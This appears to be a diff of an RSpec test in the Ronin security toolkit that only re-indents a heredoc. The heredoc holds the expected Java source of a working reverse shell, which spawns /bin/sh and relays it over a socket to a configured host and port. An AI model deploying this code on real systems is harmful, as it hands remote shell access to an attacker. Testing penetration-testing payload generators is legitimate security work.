@@ -32,61 +32,61 @@ describe Ronin::Payloads::Java::ReverseShell do
     it "must generate generate a new .java file containing the host and port" do
       expect(File.read(subject.java_file)).to eq(
         <<~JAVA
-        import java.io.IOException;
-        import java.io.InputStream;
-        import java.io.OutputStream;
-        import java.net.Socket;
+          import java.io.IOException;
+          import java.io.InputStream;
+          import java.io.OutputStream;
+          import java.net.Socket;
 
-        public class Payload
-        {
-        	public static void main(String argv[]) throws Exception
-        	{
-        		String host = "#{host}";
-        		int port = #{port};
-        		String shell = "/bin/sh";
+          public class Payload
+          {
+          	public static void main(String argv[]) throws Exception
+          	{
+          		String host = "#{host}";
+          		int port = #{port};
+          		String shell = "/bin/sh";
 
-        		Process process = new ProcessBuilder(shell).redirectErrorStream(true).start();
-        		Socket socket = new Socket(host,port);
+          		Process process = new ProcessBuilder(shell).redirectErrorStream(true).start();
+          		Socket socket = new Socket(host,port);
 
-        		InputStream process_input =process.getInputStream();
-        		InputStream process_error = process.getErrorStream();
-        		InputStream socket_input = socket.getInputStream();
-        		OutputStream process_output = process.getOutputStream();
-        		OutputStream socket_output = socket.getOutputStream();
+          		InputStream process_input =process.getInputStream();
+          		InputStream process_error = process.getErrorStream();
+          		InputStream socket_input = socket.getInputStream();
+          		OutputStream process_output = process.getOutputStream();
+          		OutputStream socket_output = socket.getOutputStream();
 
-        		while (!socket.isClosed())
-        		{
-        			while (process_input.available()>0)
-        			{
-        				socket_output.write(process_input.read());
-        			}
+          		while (!socket.isClosed())
+          		{
+          			while (process_input.available()>0)
+          			{
+          				socket_output.write(process_input.read());
+          			}
 
-        			while (process_error.available()>0)
-        			{
-        				socket_output.write(process_error.read());
-        			}
+          			while (process_error.available()>0)
+          			{
+          				socket_output.write(process_error.read());
+          			}
 
-        			while (socket_input.available()>0)
-        			{
-        				process_output.write(socket_input.read());
-        			}
+          			while (socket_input.available()>0)
+          			{
+          				process_output.write(socket_input.read());
+          			}
 
-        			socket_output.flush();
-        			process_output.flush();
-        			Thread.sleep(50);
+          			socket_output.flush();
+          			process_output.flush();
+          			Thread.sleep(50);
 
-        			try
-        			{
-        				process.exitValue();
-        				break;
-        			}
-        			catch (Exception e) {}
-        		};
+          			try
+          			{
+          				process.exitValue();
+          				break;
+          			}
+          			catch (Exception e) {}
+          		};
 
-        		process.destroy();
-        		socket.close();
-        	}
-        }
+          		process.destroy();
+          		socket.close();
+          	}
+          }
         JAVA
       )
     end
